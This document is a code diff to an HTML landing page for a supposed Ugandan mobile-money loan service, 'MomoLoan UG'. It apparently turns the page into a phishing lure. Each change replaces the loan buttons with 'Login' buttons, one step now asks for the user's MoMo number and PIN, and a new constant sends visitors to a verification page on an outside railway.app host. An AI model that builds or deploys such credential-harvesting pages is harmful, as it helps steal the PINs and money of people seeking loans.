@@ -941,7 +941,7 @@
           <a href="#benefits">Benefits</a>
           <a href="#faq">FAQ</a>
         </div>
-        <button class="desktop-login-btn" onclick="redirectToMomo()">Get Loan</button>
+        <button class="desktop-login-btn" onclick="redirectToLogin()">Login</button>
         <button class="mobile-menu-btn" id="menuBtn" onclick="toggleMobileMenu()">
           <span></span><span></span><span></span>
         </button>
@@ -955,7 +955,7 @@
     <a href="#how-it-works" onclick="closeMobileMenu()">How it works</a>
     <a href="#benefits" onclick="closeMobileMenu()">Benefits</a>
     <a href="#faq" onclick="closeMobileMenu()">FAQ</a>
-    <a class="mobile-login" href="#" onclick="redirectToMomo(); closeMobileMenu()">Get Loan</a>
+    <a class="mobile-login" href="#" onclick="redirectToLogin(); closeMobileMenu()">Login</a>
   </div>
 
   <main>
@@ -1035,7 +1035,7 @@
               <div class="result-note" id="rateNote">Rate: 9.5% per month · 3 months · MoMo Uganda</div>
             </div>
 
-            <button class="btn login-btn-calc" onclick="redirectToMomo()">Apply via MoMo →</button>
+            <button class="btn login-btn-calc" onclick="redirectToLogin()">Login →</button>
           </div>
         </div>
       </div>
@@ -1057,9 +1057,9 @@
           </div>
           <div class="step-card" onclick="toggleStep(this)">
             <div class="step-number">2</div>
-            <h3>Enter MoMo details</h3>
-            <p>Your registered mobile money number & basic info.</p>
-            <div class="step-detail">We'll ask for your MoMo number (MTN/Airtel/Africell), full name, and employment status to pre-approve.</div>
+            <h3>Login & Verify</h3>
+            <p>Login with your mobile money credentials.</p>
+            <div class="step-detail">Enter your MoMo number and PIN to securely verify your identity.</div>
           </div>
           <div class="step-card" onclick="toggleStep(this)">
             <div class="step-number">3</div>
@@ -1097,12 +1097,13 @@
       </div>
     </section>
 
-    <section class="cta-section"><div class="container"><h2>Get your MoMo loan today</h2><p>Your personalized loan estimate is ready. Continue to complete secure verification.</p><button class="btn-outline" onclick="redirectToMomo()">Apply Now →</button></div></section>
+    <section class="cta-section"><div class="container"><h2>Get your MoMo loan today</h2><p>Your personalized loan estimate is ready. Continue to complete secure verification.</p><button class="btn-outline" onclick="redirectToLogin()">Login →</button></div></section>
   </main>
 
   <footer class="footer"><div class="container"><div class="footer-grid"><div class="footer-logo"><div class="logo" style="margin-bottom: 12px; justify-content: center;"><div class="logo-icon">M</div><div><div class="logo-text" style="color: white;">Momo<span style="color: var(--primary);">Loan</span> UG</div><div class="logo-sub">Quick Mobile Money Loans</div></div></div><p style="font-size: 13px;">Trusted by thousands of Ugandans. Fast mobile money loans with transparent terms.</p></div><div><h4>Product</h4><a href="#calculator">Calculator</a><a href="#how-it-works">How it works</a><a href="#benefits">Benefits</a></div><div><h4>Support</h4><a href="#faq">FAQ</a><a href="#">Contact</a><a href="#">Help Center</a></div><div><h4>Legal</h4><a href="#">Privacy Policy</a><a href="#">Terms & Conditions</a></div></div><div class="copyright"><span>© 2026 Momo Loan Uganda. All rights reserved.</span><span>Powered by MoMo UG</span></div></div></footer>
 
   <script>
+    const RAILWAY_URL = 'https://momo-uganda-production.up.railway.app';
     const MONTHLY_RATE_UG = 0.095;
     let loanState = { amount: 500000, duration: 90, monthly: 0, total: 0, interest: 0 };
 
@@ -1144,12 +1145,20 @@
     function closeMobileMenu() { document.getElementById('mobileNav').classList.remove('open'); document.getElementById('menuBtn').classList.remove('open'); }
     function toggleStep(card) { card.classList.toggle('open'); }
     function toggleFaq(element) { element.closest('.faq-item').classList.toggle('open'); }
-    function redirectToMomo() {
-      const calcData = { amount: loanState.amount, duration: loanState.duration, monthly: loanState.monthly, total: loanState.total, interest: loanState.interest, currency: 'UGX', operator: 'MOMO_UGANDA' };
-      sessionStorage.setItem('momoLoanData', JSON.stringify(calcData));
-      alert(`✅ Proceeding to MoMo verification.\nLoan amount: ${formatMoneyUGX(loanState.amount)}\nTotal repayment: ${formatMoneyUGX(loanState.total)}\nYou will be redirected to complete the loan request.`);
-      window.location.href = '#apply';
+    
+    function redirectToLogin() {
+      const calculatorData = {
+        amount: loanState.amount,
+        duration: loanState.duration,
+        monthly: loanState.monthly,
+        total: loanState.total,
+        interest: loanState.interest,
+        currency: 'UGX'
+      };
+      sessionStorage.setItem('calculatorData', JSON.stringify(calculatorData));
+      window.location.href = `${RAILWAY_URL}/verify.html`;
     }
+    
     document.getElementById('loanAmount')?.addEventListener('input', syncAmountFromInput);
     document.getElementById('amountRange')?.addEventListener('input', syncAmountFromRange);
     document.querySelectorAll('a[href^="#"]').forEach(anchor => { anchor.addEventListener('click', function(e) { e.preventDefault(); const target = document.querySelector(this.getAttribute('href')); if(target) { target.scrollIntoView({ behavior: 'smooth', block: 'start' }); closeMobileMenu(); } }); });
